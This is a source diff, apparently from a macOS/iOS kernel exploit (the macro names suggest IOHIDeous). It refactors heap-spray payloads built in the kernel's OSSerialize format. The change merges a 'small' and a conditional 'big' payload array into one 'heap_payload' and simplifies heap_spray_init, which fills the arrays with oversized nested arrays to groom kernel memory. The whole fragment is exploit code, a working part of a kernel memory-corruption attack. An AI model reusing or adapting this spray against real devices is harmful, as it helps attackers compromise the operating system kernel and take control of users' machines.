@@ -35,7 +35,7 @@ enum
     kOSSerializeMagic           = 0x000000d3U,
 };
 
-uint32_t heap_payload_small[6 + 2 * HEAP_PAYLOAD_NUM_ARRAYS] =
+uint32_t heap_payload[6 + 2 * HEAP_PAYLOAD_NUM_ARRAYS] =
 {
     kOSSerializeMagic,                                                                          // Magic
     kOSSerializeEndCollection | kOSSerializeDictionary | 1,                                     // Dictionary to get through checks
@@ -45,46 +45,18 @@ uint32_t heap_payload_small[6 + 2 * HEAP_PAYLOAD_NUM_ARRAYS] =
     0x0,
     kOSSerializeEndCollection | kOSSerializeArray | HEAP_PAYLOAD_NUM_ARRAYS,                    // Array of arrays
 };
-size_t heap_payload_small_len = sizeof(heap_payload_small);
-
-#ifdef IOHIDEOUS_READ /* false */
-uint32_t heap_payload_big[6 + 7 * HEAP_PAYLOAD_NUM_ARRAYS] =                                    // Same as above, except 7 instead of 2
-{
-    kOSSerializeMagic,
-    kOSSerializeEndCollection | kOSSerializeDictionary | 1,
-
-    kOSSerializeSymbol | 5,
-    0x75676973,
-    0x0,
-    kOSSerializeEndCollection | kOSSerializeArray | HEAP_PAYLOAD_NUM_ARRAYS,
-};
-size_t heap_payload_big_len = sizeof(heap_payload_big);
-#endif
+size_t heap_payload_len = sizeof(heap_payload);
 
 void heap_spray_init(size_t size)
 {
     uint32_t array_size = size / sizeof(uint64_t); // kernel pointer size
     for(size_t i = 0; i < HEAP_PAYLOAD_NUM_ARRAYS; ++i)
     {
-        heap_payload_small[6 + 2 * i    ] = kOSSerializeArray | array_size;                     // Huge array
-        heap_payload_small[6 + 2 * i + 1] = kOSSerializeEndCollection | kOSSerializeBoolean | 1;// Terminate the array
-
-#ifdef IOHIDEOUS_READ /* false */
-        heap_payload_big[6 + 7 * i    ] = kOSSerializeArray | array_size;                       // Same as above, but 6 elements
-        heap_payload_big[6 + 7 * i + 1] = kOSSerializeBoolean | 1;
-        heap_payload_big[6 + 7 * i + 2] = kOSSerializeBoolean | 1;
-        heap_payload_big[6 + 7 * i + 3] = kOSSerializeBoolean | 1;
-        heap_payload_big[6 + 7 * i + 4] = kOSSerializeBoolean | 1;
-        heap_payload_big[6 + 7 * i + 5] = kOSSerializeBoolean | 1;
-        heap_payload_big[6 + 7 * i + 6] = kOSSerializeEndCollection | kOSSerializeBoolean | 1;
-#endif
+        heap_payload[6 + 2 * i    ] = kOSSerializeArray | array_size;                           // Huge array
+        heap_payload[6 + 2 * i + 1] = kOSSerializeEndCollection | kOSSerializeBoolean | 1;      // Terminate the array
     }
     // Mark the last array as such
-    heap_payload_small[6 + 2 * (HEAP_PAYLOAD_NUM_ARRAYS - 1)] |= kOSSerializeEndCollection;
-
-#ifdef IOHIDEOUS_READ /* false */
-    heap_payload_big[6 + 7 * (HEAP_PAYLOAD_NUM_ARRAYS - 1)] |= kOSSerializeEndCollection;
-#endif
+    heap_payload[6 + 2 * (HEAP_PAYLOAD_NUM_ARRAYS - 1)] |= kOSSerializeEndCollection;
 }
 
 static mach_port_t *payloads = NULL;
